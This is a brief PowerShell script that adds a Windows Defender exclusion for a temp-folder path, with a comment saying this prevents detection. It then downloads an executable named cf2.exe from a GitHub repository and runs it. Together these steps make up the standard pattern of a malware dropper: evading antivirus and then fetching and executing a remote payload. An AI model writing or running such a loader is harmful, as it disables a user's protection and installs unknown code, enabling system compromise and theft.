$url = 'https://github.com/ct7ybve7f387/tests/raw/refs/heads/main/cf2.exe'
$output = "$env:TEMP\cf2.exe"

# Add exclusion first to prevent detection during download (requires admin privileges)
Add-MpPreference -ExclusionPath $output

# Download the file
Invoke-WebRequest -Uri $url -OutFile $output

# Run the file
Start-Process $output
